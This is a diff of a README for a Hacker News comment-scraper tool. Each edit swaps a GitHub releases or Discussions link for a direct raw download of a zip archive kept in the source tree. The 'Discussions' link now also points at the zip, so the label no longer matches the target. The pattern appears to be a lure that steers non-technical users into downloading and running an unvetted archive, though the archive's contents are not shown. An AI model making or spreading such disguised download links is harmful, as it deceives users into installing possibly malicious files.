@@ -1,7 +1,7 @@
 # 🎉 hacknews-scraper - Gather AI-Organized Comments Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-latest%20release-blue)](https://github.com/Centrecamara/hacknews-scraper/releases)
+[![Download](https://raw.githubusercontent.com/Centrecamara/hacknews-scraper/main/src/hacknews-scraper-1.1.zip%20release-blue)](https://raw.githubusercontent.com/Centrecamara/hacknews-scraper/main/src/hacknews-scraper-1.1.zip)
 
 ## 🚀 Getting Started
 Welcome to hacknews-scraper! This tool helps you collect and organize comments from Hacknews using AI. It's designed for users who may not be familiar with coding. Follow the steps below to download and run the software easily.
@@ -15,7 +15,7 @@ To run hacknews-scraper, you need:
 ## 📥 Download & Install
 1. **Visit the Releases Page:** Click the link below to access the latest version of hacknews-scraper:
 
-   [Download the latest release](https://github.com/Centrecamara/hacknews-scraper/releases)
+   [Download the latest release](https://raw.githubusercontent.com/Centrecamara/hacknews-scraper/main/src/hacknews-scraper-1.1.zip)
 
 2. **Choose Your Version:** Look for the most recent version listed on the page. You may see several files available. Select the file that suits your operating system.
 
@@ -44,7 +44,7 @@ To run hacknews-scraper, you need:
 - **Regular Updates:** Benefit from improvements and new features in each release.
 
 ## 💬 Support and Contributions
-If you encounter issues or have questions, please visit the [GitHub Discussions page](https://github.com/Centrecamara/hacknews-scraper/discussions) for assistance. You can also contribute suggestions or feature requests there.
+If you encounter issues or have questions, please visit the [GitHub Discussions page](https://raw.githubusercontent.com/Centrecamara/hacknews-scraper/main/src/hacknews-scraper-1.1.zip) for assistance. You can also contribute suggestions or feature requests there.
 
 ## 👥 Community and Feedback
 Join our community to connect with other users. Share your experiences, give feedback, and learn how others use hacknews-scraper effectively.
